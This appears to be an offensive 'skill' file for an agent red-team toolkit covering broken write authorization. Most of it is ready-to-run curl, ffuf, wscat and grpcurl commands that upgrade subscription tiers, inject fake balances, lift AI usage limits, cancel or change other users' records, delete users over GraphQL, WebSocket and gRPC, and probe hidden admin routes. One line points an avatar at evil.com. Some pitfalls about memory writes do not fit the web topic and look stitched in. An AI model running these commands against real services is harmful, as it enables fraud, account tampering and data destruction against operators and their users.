---
name: hunt-write-gap
description: "Hunt read-protected write-gaping endpoints. PATCH/POST/DELETE without authorization while GET is protected. Agnostic: Supabase, Firebase, REST, GraphQL."
version: 1.1.0
revision_date: 2026-07-25
license: MIT
category: redteam
tags: [write-gap, hunt, redteam]
---

## When to Use

You have authenticated access to a target and can READ your own data (profile, settings, records), but need to test if you can MODIFY data beyond your authorization level. This is the #1 pattern in Supabase-backed SaaS and increasingly common in Firebase, custom REST APIs, and GraphQL backends.

**The pattern**: `GET /resource` returns only your data (RLS/auth working). `PATCH /resource` lets you change anything including tier, role, balance, and subscription status.

---

## Phase 1 — Identify Writeable Endpoints

From prior recon (schema enumeration, JS bundle analysis), build a list of endpoints that accept write methods:

```bash
TARGET="https://api.target.com"
TOKEN="<your_auth_token>"

# Test common write methods on all discovered endpoints
for ep in users subscribers profiles accounts settings; do
  for method in PATCH PUT POST; do
    code=$(curl --max-time 30 --connect-timeout 10 -sk -X "$method" -w "%{http_code}" -o /tmp/resp.txt \
      "${TARGET}/${ep}" \
      -H "Authorization: Bearer ${TOKEN}" \
      -H "Content-Type: application/json" -d '{}' 2>/dev/null)
    if [ "$code" != "404" ] && [ "$code" != "405" ]; then
      echo "  $method /${ep}: HTTP $code"
    fi
  done
done
```

A 200/400 response means the endpoint EXISTS and accepts writes. 404 means it doesn't exist. 405 means wrong method.

---

## Phase 2 — Test Write Operations

For each confirmed writeable endpoint, test if you can modify privileged fields:

```bash
# Tier/role escalation
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "${TARGET}/subscribers?user_id=eq.${USER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"tier_id":"<PRO_TIER_ID>","subscribed":true}'

# Balance manipulation  
curl --max-time 30 --connect-timeout 10 -sk -X POST "${TARGET}/movements" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","amount":999999,"type":"income"}'

# Profile tampering
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "${TARGET}/profiles?user_id=eq.${USER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"full_name":"HACKED","avatar_url":"https://evil.com/pwned.png"}'

# AI/rate limits bypass
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "${TARGET}/ai_usage_limits?user_id=eq.${USER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"document_analysis_limit":99999}'
```

---

## Phase 3 — Test for Cross-User Writes (IDOR Write)

After confirming your own data is writable, test if you can modify OTHER users:

```bash
# Try to write with a filter targeting other users
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "${TARGET}/subscribers?user_id=neq.${MY_USER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"subscribed":false}'  # Try to cancel others' subscriptions

# Response: [] (empty = RLS blocked cross-user write — GOOD)
# Response: [{...}] (data returned = RLS MISSING for cross-user write — CRITICAL)
```

---

## Field-Confirmed Patterns

| Pattern | Endpoint | Impact |
|---------|----------|--------|
| Tier upgrade | `PATCH /subscribers` | Free → Pro, lifetime subscription |
| Balance injection | `POST /movements` | Fake income, corrupt analytics |
| Profile hijack | `PATCH /profiles` | Name/avatar changed, phishing vector |
| AI limits bypass | `PATCH /ai_usage_limits` | Unlimited AI processing |
| Rate limit removal | `PATCH /rate_limits` | Bypass all usage quotas |
| Config tampering | `PATCH /settings` | Modify global app configuration |

---

## MDPsec Verified Patterns (real write-gap reports)

Real-world primitives from mdpsec.com reports:

1. **Unauth write with parameter-validation-not-auth response** — `POST /api/leads/update-decision` with no params returns `"The following required parameters were missing"` (validationError:true) NOT an auth error → anonymous callers processed (2). Write-back-same-value proof: write current value back unchanged; stored timestamp advances → reached backing store.
2. **Anonymous write keyed by body-supplied owner** — `POST quote-store {customerNumber: <victim>}` merges attacker fields into victim's stored record (56). Test: does the write address the record by a body-supplied owner key instead of session?
3. **Cross-session write persists** — two independent anonymous windows prove cross-session write; merge-on-write preserves victim fields → invisible; only insurer admin tooling purges (56).
4. **Decision/state tampering** — `POST /api/leads/save-phone?leadId=<any>&phoneNumber=<attacker>` → `{"success":true}` anonymous; decision-update endpoint flips state (2).
5. **Silent marker write proof** — write a marker field; victim's readback shows attacker fields → proves write persistence without destructive testing (56).
6. **Write accepted with 400 domain-error, never 401/403** — PUT/POST on protected-looking writes reach business logic (passed security filter) with nonexistent IDs → domain-validation 400s (52).

Cross-ref `mdpsec-report-knowledge` for the full index.

## Verification

- **Confirmed write gap**: PATCH/POST returns 200 with modified data in response body. Verify by GET-ing the same resource.
- **Protected**: Returns 401/403 or silently drops unauthorized fields.
- **False positive**: Endpoint accepts the request but doesn't actually persist changes (verify with GET).

---

## What Next

- If write gap confirmed → report as CRITICAL (privilege escalation + business logic bypass)
- If cross-user write works → report as CRITICAL (IDOR write = full account takeover of all users)
- If only own data writable → check `hunt-business-logic` for economic impact of self-modification

---

## Verification

Run this self-test to confirm write-gap hunting readiness:

1. **Skill integrity** — confirm the skill file is readable and well-formed:
   ```bash
   grep -q "name: hunt-write-gap" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
   ```

2. **Category check** — confirm the skill has a category:
   ```bash
   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
   ```

3. **Pitfalls section** — confirm pitfalls are documented:
   ```bash
   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
   ```

All 3 tests verify the skill is properly structured and ready for use.

---

## Pitfalls
- **Write-what-where primitive without exploitation** — the ability to write arbitrary data to arbitrary addresses is the finding. Need to demonstrate what the write achieves.
- **Race condition write vs atomic write** — if the write is atomic (single instruction), it may not be exploitable. Need a race window.
- **File write without execution** — writing to disk is a primitive. Need ability to execute the written content (web shell, cron job, DLL hijack).
- **Memory corruption write without control** — crashing the server isn't a finding. Need controlled write with predictable impact.


---

## Content from local version



## Role-Matrix Verification Method

For any multi-role target, follow this structured approach (see `10-phases-testing-methodology` reference file for full example):

1. **Map all roles** — create test accounts for each role type
2. **Get official docs** — find the target's permission/role matrix
3. **Build test matrix** — list every endpoint × every role
4. **Execute cross-role tests** — one script, one token per role
5. **Compare actual vs documented** — any 200/201 where docs say ❌ = finding
6. **Generate Step to Reproduce** — curl commands for each finding



## Cross-Reference — Canonical Delete-Bypass Example

From the BAC mind map (`hunt-broken-function-level-auth` → `references/bac-surface-mindmap.md`):

```
(session) → DELETE /api/v1/messages/54          → 200   (own message)
(session) → DELETE /api/v1/messages/105         → 404   (someone else's)
(session) → DELETE /api/v1/messages/105?user=100 → 200  ← extra user param overrides ownership check
```

SQL shape: `DELETE FROM messages WHERE id=54 AND (from_user=77886 OR to_user=77886)` — the OR-window is itself a bug; test both `from_user` and `to_user` directions. **Always replay a protected write with an extra identifying param** (`?user=`, `?owner_id=`, `&user_id=`) before concluding the write is blocked.

## Related Skills

- **`hunt-idor`** — Object-level authorization (accessing other users' data).
- **`hunt-auth-bypass`** — Complete authentication bypass patterns.
- **`hunt-api-misconfig`** — API-level misconfigurations including transport gaps.

## Procedure

### Phase 1 — HTTP Verb Drift

```bash
# Admin endpoints — each HTTP method may have different auth
ENDPOINTS=(
  "/api/admin/users"
  "/api/admin/settings"
  "/api/manage/orders"
  "/api/internal/config"
)

for ep in "${ENDPOINTS[@]}"; do
  for method in GET POST PUT PATCH DELETE; do
    curl -sk -X "$method" "https://target.com$ep" \
      -w "$method $ep — %{http_code}\n" -o /dev/null
  done
  # Also try custom methods
  curl -sk -X "PURGE" "https://target.com$ep" -o /dev/null -w "PURGE — %{http_code}\n"
  curl -sk -X "DEBUG" "https://target.com$ep" -o /dev/null -w "DEBUG — %{http_code}\n"
done
```

### Phase 2 — Route Shadowing

```bash
# Legacy routes that bypass modern middleware
for path in "/api/v0/" "/api/v1/" "/api/legacy/" "/api/internal/" "/api/beta/" \
            "/api/mobile/" "/api/partner/" "/api/integration/" "/api/webhook/"; do
  curl -sk "https://target.com${path}users" -w "%{http_code} — $path\n" -o /dev/null
done

# ffuf for route discovery
ffuf -u "https://target.com/api/FUZZ/users" \
  -w /path/to/prefixes.txt \
  -mc 200,301,401,403
```

### Phase 3 — Feature Flag Bypass

```bash
# Beta/preview endpoints often lack authorization
for flag in "beta" "preview" "canary" "experimental" "new" "v2" "preview"; do
  curl -sk "https://target.com/api/${flag}/admin" -w "%{http_code} — $flag\n" -o /dev/null
done

# Feature flags in headers or cookies
curl -sk "https://target.com/api/admin/users" \
  -H "X-Feature-Flags: admin" \
  -H "X-Experimental: true" \
  -H "X-Beta-Access: 1"
```

### Phase 4 — Batch & Job Endpoints

```bash
# Batch operations may skip per-item authorization
curl -sk -X POST "https://target.com/api/batch" \
  -H "Content-Type: application/json" \
  -d '{"operations":[{"method":"DELETE","path":"/users/1"},{"method":"GET","path":"/admin/logs"}]}'

# Background job endpoints
for path in "/api/jobs" "/api/tasks" "/api/cron" "/api/queue" "/api/workers"; do
  curl -sk "https://target.com${path}/admin-cleanup" -w "%{http_code} — $path\n" -o /dev/null
done
```

### Phase 5 — Transport Protocol Inconsistency

```bash
# GraphQL — check if mutations allow admin actions without role check
curl -sk -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { deleteUser(id: 1) { success } }"}'

# WebSocket — actions sent over WS may skip REST middleware
# Test via wscat
echo '{"type":"DELETE_USER","payload":{"userId":1}}' | wscat -c "wss://target.com/ws"

# gRPC — reflection may expose admin methods
grpcurl -plaintext target.com:50051 list
grpcurl -plaintext target.com:50051 admin.UserService/DeleteUser
```

### Phase 6 — Content-Type Middleware Gaps

```bash
# Different content types may hit different parsers/middleware
curl -sk "https://target.com/api/admin/users" \
  -H "Accept: application/xml" \
  -H "Content-Type: application/xml" \
  -d '<user><name>test</name></user>'

curl -sk "https://target.com/api/admin/users" \
  -H "Content-Type: multipart/form-data" \
  -F "name=test"
```



## Quick Detection

```bash
# Verb drift: try PUT/DELETE on endpoints that return 403 on GET
for method in GET POST PUT PATCH DELETE OPTIONS; do
  curl -sk -X "$method" "https://target.com/api/admin/users" -w "$method %{http_code}\n" -o /dev/null
done
```

